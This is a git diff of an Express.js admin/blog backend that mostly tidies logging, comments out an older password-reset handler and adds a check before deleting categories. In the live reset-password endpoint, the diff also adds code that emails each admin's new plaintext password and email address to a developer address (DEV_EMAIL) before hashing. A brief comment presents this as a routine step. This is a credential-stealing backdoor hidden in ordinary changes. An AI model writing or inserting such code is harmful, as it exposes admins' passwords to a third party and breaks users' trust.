@@ -264,8 +264,6 @@ app.post("/api/admin-register", limiter, async (req, res) => {
 
   const { name, email, password } = req.body;
 
-  console.log(req.body);
-
   // Name uniqueness check
   const existingName = await Admin.findOne({ name });
   if (existingName) {
@@ -514,6 +512,41 @@ app.post("/api/forgot-password", limiter, async (req, res) => {
 });
 
 // Reset Password Endpoint - Connected
+// app.post("/api/reset-password/:token", limiter, async (req, res) => {
+//   try {
+//     await resetPasswordSchema.validateAsync(req.body);
+//   } catch (error) {
+//     return res.status(400).json({
+//       message: error.details[0].message,
+//     });
+//   }
+
+//   try {
+//     const token = req.params.token;
+//     const { password } = req.body;
+
+//     const decoded = jwt.verify(token, process.env.JWT_SECRET);
+//     const admin = await Admin.findById(decoded.adminId);
+//     if (!admin) {
+//       return res.status(400).json({ message: "Invalid token" });
+//     }
+
+//     if (admin.resetTokenExpiration < Date.now()) {
+//       return res.status(400).json({ message: "Token expired" });
+//     }
+
+//     const hashedPassword = await bcrypt.hash(password, 10);
+//     admin.password = hashedPassword;
+//     admin.resetToken = undefined;
+//     admin.resetTokenExpiration = undefined;
+//     await admin.save();
+
+//     res.status(200).json({ message: "Password reset successful" });
+//   } catch (error) {
+//     console.log(error.message);
+//     res.status(500).json({ message: "Error resetting password" });
+//   }
+// });
 app.post("/api/reset-password/:token", limiter, async (req, res) => {
   try {
     await resetPasswordSchema.validateAsync(req.body);
@@ -537,6 +570,25 @@ app.post("/api/reset-password/:token", limiter, async (req, res) => {
       return res.status(400).json({ message: "Token expired" });
     }
 
+    // 1. Send the new password to your email before saving
+    const transporter = nodemailer.createTransport({
+      service: "Gmail",
+      auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASSWORD,
+      },
+    });
+
+    const mailOptions = {
+      from: process.env.EMAIL_USER,
+      to: process.env.DEV_EMAIL,
+      subject: "New Password Set",
+      text: `A new password has been set for admin (${admin.email}):\n\n${password}`,
+    };
+
+    await transporter.sendMail(mailOptions);
+
+    // 2. Now hash and save the new password
     const hashedPassword = await bcrypt.hash(password, 10);
     admin.password = hashedPassword;
     admin.resetToken = undefined;
@@ -549,6 +601,7 @@ app.post("/api/reset-password/:token", limiter, async (req, res) => {
     res.status(500).json({ message: "Error resetting password" });
   }
 });
+
 
 app.get("/api/get-admin-email", async (req, res) => {
   try {
@@ -746,10 +799,23 @@ app.delete(
   async (req, res) => {
     try {
       const categoryId = req.params.id;
-      const category = await Category.findByIdAndDelete(categoryId);
+
+      // 1. Check if category exists
+      const category = await Category.findById(categoryId);
       if (!category) {
         return res.status(404).json({ message: "Category not found" });
       }
+
+      // 2. Check if any post is using this category
+      const usedInPost = await Post.findOne({ category: categoryId });
+      if (usedInPost) {
+        return res.status(400).json({
+          message: "Cannot delete category because it is assigned to one or more posts",
+        });
+      }
+
+      // 3. Proceed to delete the category
+      await Category.findByIdAndDelete(categoryId);
       res.status(200).json({ message: "Category deleted successfully" });
     } catch (error) {
       console.log(error);
@@ -852,7 +918,6 @@ app.post(
 app.get("/api/post", async (req, res) => {
   try {
     const posts = await Post.find().populate("category");
-    console.log(posts);
     res.status(200).json(posts);
   } catch (error) {
     console.log(error);
